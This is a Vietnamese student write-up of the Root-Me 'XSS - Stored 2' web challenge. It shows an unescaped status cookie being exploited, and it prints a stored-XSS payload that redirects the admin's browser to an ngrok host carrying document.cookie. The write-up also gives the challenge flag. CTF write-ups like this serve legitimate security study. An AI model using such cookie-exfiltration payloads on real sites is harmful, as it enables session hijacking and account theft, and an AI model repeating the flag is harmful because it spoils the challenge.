# Challenge: XSS - Stored 2
## Người làm:   
    Nguyễn Ngọc Trưởng - 19522440
    Thời gian: 120 phút
## Link: 
    https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2

- Ta thử với các input kiểm tra có bị lỗi XSS cơ bản không
<p align="center"><img src="./images/6.1.png"></p>
- Kiểm tra mã nguồn thì ta thấy những giá trị nhập vào đều được chuyển đổi các kí tự đặc biệt, do vậy ta có thể khai khác được lỗi XSS từ đây
<p align="center"><img src="./images/6.2.png"></p>
- nhìn source code ta thấy 1 giá trị invite? trước thẻ html render ra input ta đã nhập, Kiểm tra kĩ thì ta thấy được rằng nó là giá trị của cookie status
<p align="center"><img src="./images/6.3.png"></p>
<p align="center"><img src="./images/6.4.png"></p>
<p align="center"><img src="./images/6.5.png"></p>

- Thử với giá trị `status=<h1>Nguyen Ngoc Truong</h1>`, ta thấy giá trị của nó trong thuộc tính của thẻ i không bị chuyển đổi kí tự đặc biệt

<p align="center"><img src="./images/6.6.png"></p>
<p align="center"><img src="./images/6.7.png"></p>

- Ta tiến hành đóng thẻ i thử, khi đó thử với status=`"><h1>LAo Ngoc 2k1</h1>`, ta thấy nó có sự thay đổi về giao diện. thẻ h1 được render
<p align="center"><img src="./images/6.8.png"></p>

- Vì mình cần lấy ra cookie do vậy ta thử với `"><script>alert(document.cookie)</script>` lúc này ta nhận được thông báo.
<p align="center"><img src="./images/6.9.png"></p>

- Thay đổi status `= "><script>document.location="http://1173-113-161-73-246.ngrok.io/?cookie="+document.cookie</script>`ta khi tải lại trang, ta thấy trang web của challenge tự chuyển hướng sang trang web của chúng ta.
<p align="center"><img src="./images/6.10.png"></p>
- Chờ đợi và nhận Cookie của Admin
<p align="center"><img src="./images/6.11.png"></p>
- Trong challenge có nó chúng ta cần truy cập với phiên admin, do vậy chúng ta thêm cookie đã lấy được và truy cập lại trang web, nhấn vào admin ta sẽ thấy được pass
<p align="center"><img src="./images/6.12.png"></p>

## Kết quả flag là `E5HKEGyCXQVsYaehaqeJs0AfV`